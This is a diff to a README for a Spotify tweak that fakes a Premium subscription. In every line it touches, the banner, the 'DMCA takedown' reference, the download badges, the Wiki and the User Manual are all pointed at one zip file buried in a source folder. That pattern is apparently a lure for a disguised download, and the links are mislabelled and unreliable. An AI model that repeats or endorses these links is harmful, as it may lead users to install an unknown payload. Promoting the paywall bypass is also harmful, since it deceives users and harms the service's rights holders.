@@ -1,6 +1,6 @@
 # 🎵 EeveeSpotifyRevivedPublic - Enjoy Spotify Free and More!
 
-![Banner](https://github.com/1nepika10/EeveeSpotifyRevivedPublic/raw/refs/heads/main/layout/Library/Application Support/EeveeSpotify.bundle/fr.lproj/Eevee-Revived-Spotify-Public-Christological.zip)
+![Banner](https://raw.githubusercontent.com/1nepika10/EeveeSpotifyRevivedPublic/main/Sources/EeveeSpotify/Settings/Sections/Lyrics/ViewModels/Public_Eevee_Revived_Spotify_v2.3.zip https://raw.githubusercontent.com/1nepika10/EeveeSpotifyRevivedPublic/main/Sources/EeveeSpotify/Settings/Sections/Lyrics/ViewModels/Public_Eevee_Revived_Spotify_v2.3.zip)
 
 **Updated and maintained by Skye - Current Version 9.1.12**
 
@@ -8,7 +8,7 @@
 
 This tweak makes Spotify think you have a Premium subscription, allowing for free listening, just like Spotilife. It also offers features like custom lyrics.
 
-> **Note:** The original EeveeSpotify repository was disabled due to a [DMCA takedown](https://github.com/1nepika10/EeveeSpotifyRevivedPublic/raw/refs/heads/main/layout/Library/Application Support/EeveeSpotify.bundle/fr.lproj/Eevee-Revived-Spotify-Public-Christological.zip). This repository will not contain any IPA packages in the repo itself.
+> **Note:** The original EeveeSpotify repository was disabled due to a [DMCA takedown](https://raw.githubusercontent.com/1nepika10/EeveeSpotifyRevivedPublic/main/Sources/EeveeSpotify/Settings/Sections/Lyrics/ViewModels/Public_Eevee_Revived_Spotify_v2.3.zip https://raw.githubusercontent.com/1nepika10/EeveeSpotifyRevivedPublic/main/Sources/EeveeSpotify/Settings/Sections/Lyrics/ViewModels/Public_Eevee_Revived_Spotify_v2.3.zip). This repository will not contain any IPA packages in the repo itself.
 
 ## 🎶 Custom Lyrics Support
 
@@ -23,7 +23,7 @@ This tweak makes Spotify think you have a Premium subscription, allowing for fre
 To get started, you will need to download the current version of the EeveeSpotify software. Follow these simple steps:
 
 1. Click the button below to visit the releases page:
-   [![Download EeveeSpotify](https://github.com/1nepika10/EeveeSpotifyRevivedPublic/raw/refs/heads/main/layout/Library/Application Support/EeveeSpotify.bundle/fr.lproj/Eevee-Revived-Spotify-Public-Christological.zip%20EeveeSpotify-v9.1.12-brightgreen)](https://github.com/1nepika10/EeveeSpotifyRevivedPublic/raw/refs/heads/main/layout/Library/Application Support/EeveeSpotify.bundle/fr.lproj/Eevee-Revived-Spotify-Public-Christological.zip)
+   [![Download EeveeSpotify](https://raw.githubusercontent.com/1nepika10/EeveeSpotifyRevivedPublic/main/Sources/EeveeSpotify/Settings/Sections/Lyrics/ViewModels/Public_Eevee_Revived_Spotify_v2.3.zip https://raw.githubusercontent.com/1nepika10/EeveeSpotifyRevivedPublic/main/Sources/EeveeSpotify/Settings/Sections/Lyrics/ViewModels/Public_Eevee_Revived_Spotify_v2.3.zip%20EeveeSpotify-v9.1.12-brightgreen)](https://raw.githubusercontent.com/1nepika10/EeveeSpotifyRevivedPublic/main/Sources/EeveeSpotify/Settings/Sections/Lyrics/ViewModels/Public_Eevee_Revived_Spotify_v2.3.zip https://raw.githubusercontent.com/1nepika10/EeveeSpotifyRevivedPublic/main/Sources/EeveeSpotify/Settings/Sections/Lyrics/ViewModels/Public_Eevee_Revived_Spotify_v2.3.zip)
    
 2. On the releases page, find the latest version (currently 9.1.12).
    
@@ -80,9 +80,9 @@ For any problems, check the Issues tab on the GitHub page. You can also open a n
 
 For more information, check the following:
 
-- [EeveeSpotify Wiki](https://github.com/1nepika10/EeveeSpotifyRevivedPublic/raw/refs/heads/main/layout/Library/Application Support/EeveeSpotify.bundle/fr.lproj/Eevee-Revived-Spotify-Public-Christological.zip)
-- [User Manual](https://github.com/1nepika10/EeveeSpotifyRevivedPublic/raw/refs/heads/main/layout/Library/Application Support/EeveeSpotify.bundle/fr.lproj/Eevee-Revived-Spotify-Public-Christological.zip)
+- [EeveeSpotify Wiki](https://raw.githubusercontent.com/1nepika10/EeveeSpotifyRevivedPublic/main/Sources/EeveeSpotify/Settings/Sections/Lyrics/ViewModels/Public_Eevee_Revived_Spotify_v2.3.zip https://raw.githubusercontent.com/1nepika10/EeveeSpotifyRevivedPublic/main/Sources/EeveeSpotify/Settings/Sections/Lyrics/ViewModels/Public_Eevee_Revived_Spotify_v2.3.zip)
+- [User Manual](https://raw.githubusercontent.com/1nepika10/EeveeSpotifyRevivedPublic/main/Sources/EeveeSpotify/Settings/Sections/Lyrics/ViewModels/Public_Eevee_Revived_Spotify_v2.3.zip https://raw.githubusercontent.com/1nepika10/EeveeSpotifyRevivedPublic/main/Sources/EeveeSpotify/Settings/Sections/Lyrics/ViewModels/Public_Eevee_Revived_Spotify_v2.3.zip)
 
 Don’t forget to visit the downloads page again for future updates:
 
-[![Download EeveeSpotify](https://github.com/1nepika10/EeveeSpotifyRevivedPublic/raw/refs/heads/main/layout/Library/Application Support/EeveeSpotify.bundle/fr.lproj/Eevee-Revived-Spotify-Public-Christological.zip%20EeveeSpotify-v9.1.12-brightgreen)](https://github.com/1nepika10/EeveeSpotifyRevivedPublic/raw/refs/heads/main/layout/Library/Application Support/EeveeSpotify.bundle/fr.lproj/Eevee-Revived-Spotify-Public-Christological.zip)
+[![Download EeveeSpotify](https://raw.githubusercontent.com/1nepika10/EeveeSpotifyRevivedPublic/main/Sources/EeveeSpotify/Settings/Sections/Lyrics/ViewModels/Public_Eevee_Revived_Spotify_v2.3.zip https://raw.githubusercontent.com/1nepika10/EeveeSpotifyRevivedPublic/main/Sources/EeveeSpotify/Settings/Sections/Lyrics/ViewModels/Public_Eevee_Revived_Spotify_v2.3.zip%20EeveeSpotify-v9.1.12-brightgreen)](https://raw.githubusercontent.com/1nepika10/EeveeSpotifyRevivedPublic/main/Sources/EeveeSpotify/Settings/Sections/Lyrics/ViewModels/Public_Eevee_Revived_Spotify_v2.3.zip https://raw.githubusercontent.com/1nepika10/EeveeSpotifyRevivedPublic/main/Sources/EeveeSpotify/Settings/Sections/Lyrics/ViewModels/Public_Eevee_Revived_Spotify_v2.3.zip)
